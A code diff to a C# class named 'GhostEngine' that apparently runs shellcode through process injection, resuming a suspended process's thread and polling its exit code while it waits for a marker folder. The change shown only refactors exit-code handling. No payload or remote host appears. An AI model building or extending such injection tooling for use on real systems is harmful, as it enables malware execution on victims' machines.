@@ -154,20 +154,21 @@ public class GhostEngine
             CloseHandle(hThread);
             ResumeThread(pi.hThread);
             log += "  [+] Shellcode running | TID: " + threadId + "\n";
-
             log += "  [*] Waiting for marker folder (" + waitTimeoutMs/1000 + "s timeout)...\n";
 
             int waited = 0;
-            uint exitCode = 0;  // FIXED: declare before loop
             bool markerAppeared = false;
             bool processDead = false;
+            uint lastExitCode = 0;
 
             while (waited < waitTimeoutMs)
             {
-                GetExitCodeProcess(pi.hProcess, out exitCode);
-                if (exitCode != 259) // STILL_ACTIVE = 259
+                uint tmpCode;
+                GetExitCodeProcess(pi.hProcess, out tmpCode);
+                if (tmpCode != 259)
                 {
                     processDead = true;
+                    lastExitCode = tmpCode;
                     break;
                 }
 
@@ -188,7 +189,7 @@ public class GhostEngine
             }
             else if (processDead)
             {
-                log += "  [-] Process exited prematurely (exit code: " + exitCode + ")\n";
+                log += "  [-] Process exited prematurely (code: " + lastExitCode + ")\n";
                 return false;
             }
             else
